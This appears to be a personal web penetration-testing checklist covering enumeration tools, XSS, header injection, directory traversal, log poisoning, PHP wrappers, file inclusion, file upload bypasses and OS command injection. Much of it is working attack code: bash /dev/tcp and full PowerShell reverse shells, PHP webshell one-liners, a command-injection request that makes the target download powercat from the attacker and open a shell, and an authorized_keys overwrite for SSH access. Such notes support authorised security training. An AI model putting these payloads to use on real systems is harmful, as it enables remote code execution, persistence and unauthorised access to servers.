# HTTP Checklist

1. Fingerprint with Nmap, then run script to enumerate further
```bash
sudo nmap -p80 --script=http-enum $IP
```
2. Analyze tech stack with Wappalyzer
3. Brute force directories, subdomains, files and apis
```bash
gobuster dir -u http://$IP -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30
gobuster dns -d http://$IP -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
gobuster dir -u http://$IP -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
# for api busting
cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
sed -i 's/^/{GOBUSTER}\//' apis
gobuster dir -u http://$IP:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
# If you get hits, try to discover more directories using a smaller wordlist
```
4. Nikto
```bash
nikto --host $IP -ssl -evasion 1
```
5. Manual code inspection

- Look for emails, names, user info, versioning (checking with searchsploit), examine input box code (checking for hidden form fields), anything interesting, check out robots.txt & sitemap.xml
- Inspect every fkn inch of the website

6. WPscan if it's wordpress
```bash
wpscan --url $URL --enumerate p --plugins-detection aggressive # aggressive plugin detection
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt # use the usernames that you have from above
```

7. Potentially brute forcing admin/login panel with Burp Intruder

8. Create a wordlist from the webpage using cewl:
```bash
cewl http://example.com -d 4 -m 5 -w cewl.txt
hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule cewl.txt cewl-best64.txt
```

9. Run droopescan
```bash
droopescan -t <number_of_threads> <target_website>
```

10. XSS (Input Fields)
- Spam special characters, see what is filtered, what gets interpreted as code
```bash
~!@#$%^&*()-_+={}][|\`,./?;:'"<>
```
- If our input is being added between div tags, we'll need to include our own script tags4 and need to be able to inject "<" and ">" as part of the payload
- If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code

11. 403 Forbidden Bypass

Refer to 403-forbidden-bypass.sh.

12. Header Injection

- Check if you can inject the following into the User-Agent header:

```bash
<script>alert(42)</script>
# or the following to see if it pings your python http server
<a href="http://192.168.192.121:8000/your-endpoint">Send GET Request</a>
```

If so, try injecting a reverse shell.

```bash
# on your machine, try to remove all special characters through strategic spacing
echo -n 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1' | base64
# send the following
echo BASE64_ENCODED_STRING | base64 -d | bash
# or
echo -n "bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'" | base64
# send the following
echo BASE64_ENCODED_STRING | base64 -d
# or the following if spaces aren't allowed
{echo,-n,**base64 encoded reverse bash shell**}|{base64,-d}|bash
```

13. Directory Traversal

- If there's something like "https://example.com/cms/login.php?language=en.html", then try to navigate to the file directly with "https://example.com/cms/en.html". If you can, this confirms that en.html is a file on the server and it may be vulnerable to something like "http://example.com/subdir/index.php?page=../../../../../../../../../etc/passwd"

- Try double and triple encoding, "..././", "..;/", and potentially unicode encoding as referenced in the document below

- Refer to (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#16-bits-unicode-encoding) for a whole bunch of awesome payloads, and interesting files to look for on both Windows and Linux. Doesn't include "C:\Windows\System32\drivers\etc\hosts", "C:\inetpub\logs\LogFiles\W3SVC1\\", and "C:\inetpub\wwwroot\web.config"

14. Stealing Session Cookies

- See if there are any cookies present without the HttpOnly and Secure flags. If this is in the context of WordPress, there's a walkthrough in ../notes/web_assessment_and_xss.md.

15. Log Poisoning / Local File Inclusion

- RCE (PHP) through log poisoning (likely /var/log/apache2/access.log). See if you can read the file and see what contents are stored (i.e. User-Agent):

```bash
curl http://example.com/subdir/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

If so, use Burp to change the user agent header:
```bash
<?php echo system($_GET['cmd']); ?>
```

And see if you can execute commands like the following, if so, try a url encoded bash or php reverse shell:

```
GET /subdir/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls
```

..if something else, do something else.

16. PHP Wrappers

Attempt to show the contents of php file:

```bash
curl http://example.com/subdir/index.php?page=php://filter/convert-base64-encode/resource=admin.php
```

Attempt to achieve code execution:

```bash
curl "http://example.com/subdir/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
# if works, then
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://example.com/subdir/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
# or a reverse shell
```

17. Remote File Inclusion

- If the website is loading files or contents from remote systems, then RFI may be possible. You can go into Developer Tools to discover this in source, etc.

```bash
cp /usr/share/webshells/php/simple-backdoor.php .
python3 -m http.server
curl "http://example.com/subdir/index.php?page=http://$YOUR_IP/simple-backdoor.php&cmd=ls"
```

18. File Upload Vulns (Executable)

- Wherever you can upload files, see what files you are allowed to upload. If .php files are blacklisted, then you can try to use .pHP, .phps, .php7, pht, phpt, phtml, php3, php4, php5, php6 instead. If .sh files are blacklisted, then you can try to use .zsh instead.

- Whitelisting may be able to be bypassed through methods such as adding a null byte injection, "shell.php%00.txt", or by using double extensions for the file, "shell.txt.php"

- Try changing the Content-Type header in Burp to something that you know it accepts, such as s image/jpeg, image/gif, image/png.

- See if you can intercept and modify the files, naming the php file shell.txt initially, then changing it to shell.php.

- With Windows, replace php with aspx in the examples if you don't know what to use.

- If you're able to upload a simple webshell, then see if you can execute commands:

```bash
curl http://example.com/meteor/subdir/simple-backdoor.pHP?cmd=dir
```

If you can, then get a reverse shell with powershell (>-<):

```bash
kali@kali:~$ pwsh
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0
...
PS> exit
kali@kali:~$ nc -nvlp 4444
kali@kali:~$ curl http://example.com/subdir/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAG...
```

19. File Upload Vulns (Non-Executable)

- When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.

- With Burp, try testing directory traversal by modifying the file's name. If the response includes the modified pathname, then it's a good sign that it worked, though it could've just sanitized it internally.

- If this works, then try to blindly overwrite write in the database, such as the ssh key, and then ssh in:

```bash
kali@kali:~$ ssh-keygen
kali@kali:~$ cat keyname.pub > authorized_keys
```

Then, use the method as told above on the path "../../../../../../../root/.ssh/authorized_keys" or "/home/www-data/.ssh/authorized_keys", noting that you can try a username instead or "~/.ssh/authorized_keys" or "%USERPROFILE%\.ssh\authorized_keys" for Windows. If you can read /etc/passwd, then adjust to the names. Make sure to delete the known_hosts file if you have used the key with another machine. I assume that you can also just create a new one to use without deleting the file.

20. OS Command Injection

If there's any part of the website that intakes commands, see if you can add your own. They're likely filtered, though you may be able to get around this by closing off the command with a semicolon. In the following example, we saw (with Burp) that the commands were being sent through the Archive header with a Post:

```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive # to find out if the commands are executed by CMD or Powershell
```

Given that it's Powershell:

```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
nc -lvnp 4444
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

21. SQL Injection

- Refer to ./sqli.md

22. Client-Side Attacks

If there if a section where you can mail the company, refer to ../notes/client_side_attacks.md. Also look out for svc, anything where files with Macros can be accepted.

23. Exiftool

Use exiftool to analyze a few documents on the website, see what information you can get. Wget will give you better information than curl.

24. Brute-Force Passwords

Refer to ../notes/password_cracking.md